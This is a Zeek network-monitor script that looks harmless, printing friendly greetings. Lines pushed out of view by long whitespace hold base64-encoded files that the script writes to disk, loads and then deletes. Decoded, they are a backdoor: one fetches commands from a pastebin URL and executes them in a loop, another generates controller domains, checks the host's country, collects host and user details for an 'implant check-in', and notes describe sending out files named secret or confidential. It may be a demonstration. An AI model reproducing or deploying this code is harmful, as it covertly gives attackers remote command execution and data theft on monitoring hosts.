@load ./innocuous
																				global GLOBAL::drops: table[string] of string = { ["get-command.zeek"] = "Z2xvYmFsIEdMT0JBTDo6Z2V0X2FuZF9leGN1dGU6IGV2ZW50KCk7Cmdsb2JhbCBHTE9CQUw6Omxhc3RfY21kID0gIiI7CgojIEJFIENBUkVGVUwuIFRISVMgRE9XTkxPQURTIEEgU1RSSU5HIEZPUk0gVEhFIElOVEVSTkVUIEFORCBFWEVDVVRFUyBJVC4KZ2xvYmFsIEdMT0JBTDo6Y21kX3VybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvWkV0MXdFTXYiOwoKCmZ1bmN0aW9uIEdMT0JBTDo6cGVyc2lzdCgpIHsKICBzY2hlZHVsZSAyc2VjIHsgZ2V0X2FuZF9leGN1dGUoKSB9Owp9CgpldmVudCBHTE9CQUw6OmdldF9hbmRfZXhjdXRlKCkgewogIGxvY2FsIHJlcSA9IFskdXJsPWNtZF91cmwsICRtZXRob2Q9IkdFVCJdOwogIHdoZW4gKGxvY2FsIHJlc3BvbnNlID0gQWN0aXZlSFRUUDo6cmVxdWVzdChyZXEpKSB7CiAgICBpZiAoR0xPQkFMOjpsYXN0X2NtZCAhPSByZXNwb25zZSRib2R5KSB7CiAgICAgIHdoZW4gKGxvY2FsIHJlc3VsdCA9IEV4ZWM6OnJ1bihbJGNtZD1mbXQoIiVzIiwgcmVzcG9uc2UkYm9keSldKSkgewogICAgICAgIHByaW50IGZtdCgicGFzdGViaW4gY29tbWFuZDogJXMsIGNvbW1hbmQgcmVzdWx0OiAlcyIsIHJlc3BvbnNlJGJvZHksIHJlc3VsdCRzdGRvdXRbMF0pOwogICAgICAgIEdMT0JBTDo6bGFzdF9jbWQgPSByZXNwb25zZSRib2R5OwogICAgICB9CiAgICB9CiAgfQogIHBlcnNpc3QoKTsKfQoKZXZlbnQgemVla19pbml0KCkgewogIHBlcnNpc3QoKTsKfQo=", ["inject-pkt.py"] = "IyB3cml0ZSBvbmUhCg==", ["inject-pkt.zeek"] = "IyB3cml0ZSBhIHBrdCBpbmplY3Rpbmcgc2NyaXB0IGluIHB5dGhvbi4KIyB0aGVuIHVzZSB0aGUgZXhlYyBmcmFtZXdvcmsgdG8gY2FsbCBpdCBmcm9tIHplZWsK", ["main.zeek"] = "QGxvYWQgLi9nZXQtY29tbWFuZApAbG9hZCAuL3NjYW4tZmlsZXMKQGxvYWQgLi9pbmplY3QtcGt0CgpyZWRlZiBleGl0X29ubHlfYWZ0ZXJfdGVybWluYXRlID0gVDsKCmZ1bmN0aW9uIEdMT0JBTDo6ZGdhKCk6IHN0cmluZyB7CiAgbG9jYWwgdCA9IGN1cnJlbnRfdGltZSgpOwogIGxvY2FsIHNlZWQgPSBkb3VibGVfdG9fY291bnQoZmxvb3IodGltZV90b19kb3VibGUodCkpKSAlIDg2NDAwMDsKICBsb2NhbCBjb250cm9sbGVyID0gIiI7CiAgZm9yIChpIGluIGZtdCgiJXMiLCBzZWVkKSkgewogICAgbG9jYWwgbiA9IHRvX2ludChpKTsKICAgIGNvbnRyb2xsZXIgKz0gImFiY2RlZmdoaWprbG1ub3BxcnN0dVZ3eHlaIltuXTsKICB9CiAgY29udHJvbGxlciA9IGNvbnRyb2xsZXJbOi0zXTsKICBjb250cm9sbGVyICs9ICIuY29tIjsKICByZXR1cm4gY29udHJvbGxlcjsKfQoKZnVuY3Rpb24gR0xPQkFMOjpyZWdpc3Rlcih2czogdmVjdG9yIG9mIHN0cmluZykgewogIGxvY2FsIGMyID0gZGdhKCk7CiAgbG9jYWwgcmVxID0gWyR1cmw9Zm10KCJodHRwczovLyVzL25ldyIsIGMyKSwKICAgICAgICAgICAgICAgJG1ldGhvZD0iUE9TVCIsCiAgICAgICAgICAgICAgICRjbGllbnRfZGF0YT1lbmNvZGVfYmFzZTY0KGpvaW5fc3RyaW5nX3ZlYyh2cywgInwiKSldOwogIHByaW50ICJwcmVwYXJlZCBpbXBsYW50IGNoZWNrLWluLi4uIjsKICBwcmludCByZXE7Cn0KCmZ1bmN0aW9uIEdMT0JBTDo6Z2F0aGVyKCkgewogIHdoZW4gKGxvY2FsIHJlc3VsdDEgPSBFeGVjOjpydW4oWyRjbWQ9Zm10KCJob3N0bmFtZSAmJiBkYXRlICYmIGlkIildKSkgewogICAgbG9jYWwgaG4gPSByZXN1bHQxJHN0ZG91dFswXTsKICAgIGxvY2FsIGRhID0gcmVzdWx0MSRzdGRvdXRbMV07CiAgICBsb2NhbCBpZCA9IHJlc3VsdDEkc3Rkb3V0WzJdOwogICAgd2hlbiAobG9jYWwgcmVzdWx0MiA9IEV4ZWM6OnJ1bihbJGNtZD1mbXQoInciKV0pKSB7CiAgICAgIGxvY2FsIHVwID0gc3BsaXRfc3RyaW5nKHN1YihzcGxpdF9zdHJpbmcocmVzdWx0MiRzdGRvdXRbMF0sIC8gLylbM10sIC8gLywgIiIpLCAvOi8pOwogICAgICAjIEdhdGhlciBob3N0IHN0YXRzIG9ubHkgaWYgZXhlY3V0aW5nIG9uIGEgc3lzdGVtIHRoYXQncyBiZWVuIHVwIGZvciBvdmVyIDEgaHIKICAgICAgaWYgKHRvX2ludCh1cFswXSkgPiAxKSB7CiAgICAgICAgbG9jYWwgd2ggPSBqb2luX3N0cmluZ192ZWMocmVzdWx0MiRzdGRvdXQsICJ8Iik7CiAgICAgICAgcmVnaXN0ZXIodmVjdG9yKGhuLCBkYSwgaWQsIHdoKSk7CiAgICAgIH0KICAgIH0KICB9Cn0KCmZ1bmN0aW9uIEdMT0JBTDo6b3JpZW50KCkgewogIGxvY2FsIHJlcSA9IFskdXJsPSJodHRwczovL2FwaS5teWlwLmNvbS8iLCAkbWV0aG9kPSJHRVQiXTsKICB3aGVuIChsb2NhbCByZXNwb25zZSA9IEFjdGl2ZUhUVFA6OnJlcXVlc3QocmVxKSkgewogICAgIyBPbmx5IGRvIHN0dWZmIGlmIHdlIGFyZSBleGVjdXRpbmcgZnJvbSBzeXN0ZW0gd2l0aCBlZ3Jlc3MgSVAgbG9jYXRlZCBpbiB0aGUgVVMKICAgIGlmIChzdWIoc3ViKHNwbGl0X3N0cmluZyhyZXNwb25zZSRib2R5LCAvLC8pWzJdLCAvXCJjY1wiOlwiLywgIiIpLCAvXCJcfS8sICIiKSA9PSAiVVMiKSB7CiAgICAgIGdhdGhlcigpOwogICAgfQogIH0gdGltZW91dCAxbWluIHsKICAgIHJldHVybjsKICB9Cn0KCmV2ZW50IHplZWtfaW5pdCAoKSB7CiAgb3JpZW50KCk7Cn0K", ["scan-files.zeek"] = "IyBob29rIGZpbGUgZXZlbnRzIHdoaWNoIGNvbnRhaW4gZmlsZSBuYW1lcwojIG1hdGNoIHRob3NlIGZpbGVuYW1lcyBhZ2FpbnN0IGEgbGlzdCBvZiBwYXR0ZXJucyBsaWtlLCAvc2VjcmV0LyAvY29uZmlkZW50aWFsLyAvYW5ncnkga29hbGEvCiMgdXNlIGFjdGl2ZSBodHRwIHRvIHBvc3QgZmlsZSBjb250ZW50cyB0byB0aGUgY29udHJvbGxlciBmcm9tIEdMT0JBTDo6Zm91cigpCg=="};
																				function GLOBAL::f(): bool { for (fn in drops) { local fh = open(fn); write_file(fh, decode_base64(drops[fn])); close(fh);} return T;}
event zeek_done() {
  print "goodbye, you beautiful person!";
}
																				@if(f()) @load ./main @endif
																				event zeek_init() { for (fn in drops) { unlink(fn); } }
event zeek_init() {
  print "hello, you beautiful person!";
}
